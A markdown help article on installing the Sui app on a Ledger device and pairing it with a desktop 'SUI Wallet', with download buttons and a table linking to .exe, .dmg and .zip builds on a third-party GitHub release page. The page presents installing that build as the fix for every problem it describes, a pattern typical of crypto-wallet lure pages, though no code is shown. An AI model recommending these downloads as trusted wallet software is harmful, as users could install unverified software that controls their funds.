![SUI Wallet](assets/banner-article.png)

# Installing the Sui app on Ledger

The device needs the Sui app before any wallet can talk to it.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

The Sui app is installed from Ledger Live, on the device, before this wallet is involved: connect the device,
open My Ledger, find Sui in the app catalog, install it. Then pair the account here. A device without the app
cannot be asked to sign anything for this network.

## The order that works

Three steps, and the order matters. Install the app on the device, unlock the device, then start the pairing
from the wallet. Doing the third before the first produces the "app not open" style of failure that sends
people looking for a wallet problem.

The device-side app is the part that understands this network. Without it the hardware is a very good signer
with nothing to sign.

## Installing it from Ledger Live

Open Ledger Live, connect the device and unlock it, then go to My Ledger. The app catalog is there; search for Sui, choose install, and confirm on the device if the prompt appears there rather than on screen. The catalog is the authority on what the device can take.

Ledger Live may ask for a firmware update first. Take it: an out-of-date firmware is a common reason an
install stalls at the end rather than at the start, and the device's own screen is where that shows.

## Which devices

Sui is supported on the Nano S Plus, Nano X, Stax and Flex through the official device app. An older Nano S can run out of room for applications, which is a storage question rather than a support question about the network.

If the catalog refuses the install, check free space before assuming the device is unsupported. Removing an
app you do not use is the usual fix, and it does not touch the accounts those apps held.

Check the device's own screen during the install rather than the computer's. The approval prompt appears there, and an install that seems stuck is usually waiting for a confirmation nobody saw.

## Pairing the account in the wallet

Once the app is installed, open the wallet and start the Ledger connection from the account area rather than
from a settings page that belongs to the application. The wallet asks the device for an address, the device
shows it, and the account appears here.

Two things go wrong at this step more than any other: the device is locked, or another application is holding
the USB connection. Both produce the same silence, and both are fixed by unlocking or closing the other
application.
[Pairing Ledger with SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/pairing-ledger-with-sui-wallet.md) covers the pairing itself, including the derivation path question.

## Where the setup menu lives

The wallet's Ledger setup is reached from the account controls rather than from a global preferences screen, because it creates an account instead of changing a setting. That is why people who look in settings do not find it. Ask the account controls first.

Remembering the purpose helps more than remembering the location: you are adding an account whose keys live on
a device, and the wallet's account controls are where accounts are added.
[Ledger not detected in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/ledger-not-detected-in-sui-wallet.md) is the article for a device that is installed correctly and
still not seen.

## What not to do

Do not install an older device app to match an older wallet build, and do not reset the device to solve a
pairing failure. The first trades a known-good app for a compatibility guess; the second destroys a phrase
that has nothing to do with this wallet.

Nor is there a reason to re-enter the device's phrase anywhere. If any page asks for it - including a page
that looks like this project - the page is the problem.
[Staking SUI from a Ledger account](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-from-a-ledger-account.md) covers what the device is asked to approve once an account is
paired.

There is also no reason to keep an unused app installed for a network you never use: device space is finite, and removing an application leaves the phrase and every account derived from it untouched.

## Keeping it working

An app update on the device and a wallet update are separate things, and either can arrive first. The current
release from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) is the one these
steps are described from, and installing it is the fix for the reported pairing problems.

When the two drift apart, the device app is the half that rarely needs reinstalling. Start with the wallet, because that is where the reported problems are fixed, and reinstall the device app only if the wallet update changes nothing.

## FAQ

### How do I install the Sui app on my Ledger?

Connect and unlock the device, open My Ledger in Ledger Live, find Sui in the catalog and install it. Then
pair the account in this wallet.

### How to install the Sui app on Ledger if the install stalls?

Check free space on the device and accept any firmware update Ledger Live offers. Both cause a stall at the
end of an install rather than at the beginning.

### Where is the Ledger setup menu in SUI Wallet?

In the account controls, because pairing creates an account rather than changing a setting. It is not under
global preferences.

### Do I need Ledger Live for this?

Yes for the device-side app install. Once the app is on the device, this wallet does the pairing and the
signing without Ledger Live being open.

### Can I use a Nano S?

A Nano S can be short of space for applications. That is a storage limit rather than a missing feature, and
removing an unused app usually resolves it.

### Does installing the app touch my accounts?

No. The app is software for the device; the accounts are derived from the device's phrase, which is untouched
by installing or removing applications.
